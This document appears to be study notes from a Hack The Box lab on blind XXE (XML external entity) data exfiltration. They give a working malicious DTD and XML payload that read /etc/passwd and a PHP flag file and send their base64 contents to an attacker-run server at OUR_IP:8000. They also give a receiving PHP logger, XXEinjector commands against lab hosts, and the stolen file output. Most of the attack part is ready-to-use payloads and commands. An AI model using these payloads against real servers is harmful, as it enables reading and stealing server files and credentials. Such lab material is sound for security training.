# Blind Data Exfiltration

See how we can get the content of files in a completely blind situation, where we neither get the output of any of the XML entities nor do we get any PHP errors displayed

## Out-of-band Data Exfiltration

Make the web application send a web request to our web server with the content of the file we are reading :

python3 -m http.server 8000

Write a script on our local server index.php:

<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>

Write xxe.dtd :

<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">

Payload to inject in POST parameter :

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>

--> also possible to do DNS OOB Exfiltration by placing the encoded data as a sub-domain for our URL and then use a tool like tcpdump to capture any incoming traffic and decode the sub-domain string to get the data

## Automated OOB Exfiltration


cat /tmp/xxe.req :

POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT


git clone https://github.com/enjoiz/XXEinjector.git


ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter


cat Logs/10.129.201.94/etc/passwd.log 


## LAB

http://10.129.31.16/blind/

vi /tmp/xxe.req

POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.31.16
Content-Length: 127
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.31.16
Referer: http://10.129.31.16/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT


git clone https://github.com/enjoiz/XXEinjector.git
cd XXEinjector

ruby XXEinjector.rb --host=10.10.15.52 --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter

cat Logs/10.129.31.16/etc/passwd.log 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin

ruby XXEinjector.rb --host=10.10.15.52 --httpport=8000 --file=/tmp/xxe.req --path=/327a6c4304ad5938eaf0efb6cc3e53dc.php --oob=http --phpfilter

cat Logs/10.129.31.16/327a6c4304ad5938eaf0efb6cc3e53dc.php.log 
<?php $flag = "HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}"; ?>
